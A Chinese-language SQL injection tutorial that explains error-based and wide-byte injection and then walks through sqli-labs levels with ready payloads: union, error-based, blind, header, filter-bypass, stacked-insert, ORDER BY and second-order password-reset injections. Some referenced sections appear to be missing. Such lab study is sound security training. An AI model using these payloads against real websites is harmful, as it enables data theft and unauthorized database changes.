一、数据库基础

1.1 数据库管理系统

数据库管理系统（DataBase Management System，DBMS）是用于建立、使用和维护数据库的软件。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。

1.2 数据库的两大类型

  • 关系型数据库：存储格式能直观反映实体间的关系，和创建的表格比较相似，表与表之间有着复杂的关联关系。常见的有 MySQL、Oracle、Microsoft SQL Server、Access 等。
  • 非关系型数据库：分布式的、非关系型的、不保证遵循 ACID 原则的数据存储系统。常见的有 MongoDB、Redis、HBase 等。

二、SQL 与 MySQL

2.1 SQL 是什么

SQL（Structured Query Language，结构化查询语言）是一种特殊目的的编程语言，用于存取数据以及查询、更新和管理关系数据库系统，同时也是数据库脚本文件的扩展名。目前几乎所有关系型数据库都用 SQL 来查询、操作和定义数据，它已经成为构造数据库查询命令的事实标准。

2.2 MySQL 与库表结构

  • MySQL 是一种开源的、基于 SQL 的关系型数据库管理系统，专门针对 Web 应用进行设计和优化，可在任何平台上运行。
  • 全球许多顶级互联网网站都采用 MySQL 作为 DBMS，例如 Facebook、Twitter、YouTube。

三、SQL 注入原理

3.1 目的

  • 查询数据
  • 读写文件
  • 执行命令

3.2 本质

把用户输入的数据当成代码来执行，违背了「数据与代码分离」的原则。

3.3 成立条件

一切漏洞都是有条件的，SQL 注入成立需要同时满足：

  1. 用户能够控制输入的内容；
  2. 数据库能够执行用户输入的内容。

3.5 分类

  • 按注入位置：GET 型、POST 型、HTTP 头注入
  • 按反馈结果：有回显（显错注入）、无回显（盲注）
  • 按数据类型：
    • 数字型：参数为整数，如 id、年龄、页码，只能由 0-9 组成
    • 字符型：参数为字符串，如 '1'
  • 两者最大的区别：数字型不需要闭合，字符型一般需要闭合

4.3 报错注入

报错注入适用于页面没有回显位、但会输出 SQL 报错信息的场景。判断依据很简单：有报错信息就是报错注入，没有就是盲注。

MySQL 报错注入主要利用数据库自身的逻辑漏洞，常见四类：

  • BigInt 等数据类型溢出
  • xpath 语法错误
  • count() + rand() + group_by() 导致主键重复
  • 空间数据类型函数错误

xpath 语法错误

MySQL 5.1.5 起提供 XML 查询与修改函数，可以借报错把执行结果带出来：

  • updatexml()：适用于 5.5.5 - 5.5.49
  • extractvalue()：适用于 5.1.5+
  • XML_document：XML 文档名
  • XPath_string：xpath 格式字符串
  • new_value：替换查找到的符合条件的数据

updatexml 的作用是查找一个字符串并替换。在第二个参数传入不符合 xpath 格式的特殊字符（同时夹带查询语句），MySQL 就会把错误信息和查询结果一起报出来，这就是 xpath 报错注入的原理。

注意事项：

  • 必须在 xpath 参数位置传入特殊字符才会报错，而该位置只够放一个参数，所以要用 concat() 拼接
  • xpath 只对特殊字符报错，常用 0x7e（~）来触发
  • 报错最多只显示 32 个字符，结果过长要用 substr() 分段输出

rand() + count() + group by

这类报错利用了虚拟表主键重复。先理解三个函数：

执行 group by 时，MySQL 内部会建一张虚拟表，用分组字段作为主键。读取数据时若虚拟表中不存在该主键就插入，主键重复就会报错。concat() 拼接上 floor(rand(0)*2) 结果只有 0 和 1 两种，配合固定种子 rand(0) 的固定序列，就能稳定触发主键冲突，从而把数据带进报错信息：

原理拆解：令 a = concat((select database()),0x7e,floor(rand(0)*2))，第一次查询时先看虚拟表中是否存在该值（例如 sqli~0），不存在就插入，而插入时会再次执行表达式，如果第二次算出的值变成 sqli~1，主键就冲突报错 —— 报错信息中恰好包含我们想要的数据。

4.4 宽字节注入

字符集也叫字符编码，是把符号转换为二进制数的映射关系：

  • ASCII：单字节编码
  • GBK：一字节与双字节混合，0x00-0x7F 范围与 ASCII 一致，双字节首字节范围 0x81-0xFE
  • UTF-8：一至四字节变长编码

宽字节指两个以上字节。宽字节注入产生的原因是字符编码处理不当，攻击者可以用宽字节编码绕过转义。

通常一个 GBK 汉字占 2 字节，一个 UTF-8 汉字占 3 字节，PHP 里可以用 strlen("和"); 验证。

成因：后端 PHP 编码与数据库编码不一致。若 PHP 用 UTF-8，而 MySQL 设置为 SET NAMES 'gbk'，编码转换过程中就会产生漏洞：

五、sqli-labs 靶场关卡索引

5.1 通用方法论

无论哪一关，都可以按这个标准化流程走：

  1. 测闭合：输入 1'、1"、1')、1")，看是否报错或页面变化，确定后台语句如何包裹参数
  2. 猜列数：用 order by N --+ 不断尝试，直到报错
  3. 定显位：用 union select 判断第几列会显示在页面上
  4. 捞数据：在显位处用 database()、group_concat(table_name) 等函数逐层取数

5.2 前 10 关（按注入类型分类）

  • 联合查询（有回显）
    • Less-1：字符型，单引号闭合，?id=-1' union select 1,2,database() --+
    • Less-2：数字型，无需引号，?id=-1 union select 1,2,database() --+
    • Less-3：字符型，单引号 + 括号，?id=-1') union select 1,2,database() --+
    • Less-4：字符型，双引号 + 括号，?id=-1") union select 1,2,database() --+
  • 报错注入（有报错无数据）
    • Less-5：单引号，?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
    • Less-6：双引号，同上换闭合符
  • 布尔盲注（无回显无报错）
    • Less-8：单引号，以页面是否出现 You are in... 判断（详细过程见 4.2）
    • ?id=1' and length((select database()))=8 --+
    • ?id=1' and ascii(substr((select database()),1,1))=115 --+
  • 时间盲注（页面完全无变化）
    • Less-9：单引号，?id=1' and if(ascii(substr((select database()),1,1))=115, sleep(3), 1) --+

5.4 Less-18 ~ 22：HTTP 头注入

注入点藏在请求头里，必须抓包修改。

  • Less-18：User-Agent，尾部加 ' 看是否报错，闭合后 1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
  • Less-19：Referer，套路同 18 关
  • Less-20：Cookie，如 uname=admin' #，联合查询 uname=-1' union select 1,2,database() #
  • Less-21：Cookie 值经过 Base64 编码，先把 payload 编码再填入，如 admin') # → YWRtaW4nKSAj
  • Less-22：Base64 编码的双引号注入，闭合 admin" #

5.5 Less-23 ~ 31：过滤绕过

这部分开始引入关键字过滤，需要绕过技巧。

  • Less-23：-- 和 # 被过滤，用引号闭合后续语句，如 ?id=-1' union select 1,2,3 and '1'='1
  • Less-24：二次注入。注册时用户名写成 admin' #，修改密码时恶意数据被代入，改的其实是 admin 的密码
  • Less-25：and / or 被替换为空，用双写 anandd、oorr，或用 &&、|| 替代
  • Less-26：空格、注释符、and/or 都被过滤，用括号或制表符替代空格，如 ?id=-1'/**/union/**/select/**/1,2,database()/**/--+
  • Less-27：union / select 被过滤，用大小写混写 UnIoN、SeLeCt
  • Less-28：union select 被过滤且带括号，用 %00 截断或双写绕过

5.6 Less-32 ~ 37：宽字节注入

数据库编码为 GBK 时，用宽字节吃掉转义符（原理见 4.4）。

  • Less-32：?id=-1%df' union select 1,2,database() --+
  • Less-33：同 32 关，后端用 addslashes()
  • Less-34：POST 宽字节，用户名框输入 %df' or 1=1 #

5.7 Less-38 ~ 45：堆叠注入

堆叠注入允许一次执行多条 SQL 语句。

  • Less-38：?id=1'; insert into users(id,username,password) values (100,'test','test') --+
  • Less-39：数字型堆叠，?id=1; insert into users values (101,'test2','test2') --+

5.8 Less-46 ~ 53：ORDER BY 注入

order by 后面的参数不能直接接 UNION，只能用报错或盲注。

  • Less-46：?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
  • Less-47：单引号闭合，?sort=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
  • Less-48：布尔盲注，?sort=1 and (select length(database()))=8

六、写在最后

SQL 注入的入口看似千变万化，但落到操作上永远是同一套动作：先判断闭合，再决定手法。闭合方式决定了能否进入语句，回显情况决定了用联合、报错、布尔还是时间盲注。

后续值得继续补充的方向：

  • 时间盲注与 DNS 外带
  • WAF 绕过（编码、注释、白名单混淆）
  • SQL 注入的防御：预编译参数化查询、最小权限、错误信息屏蔽
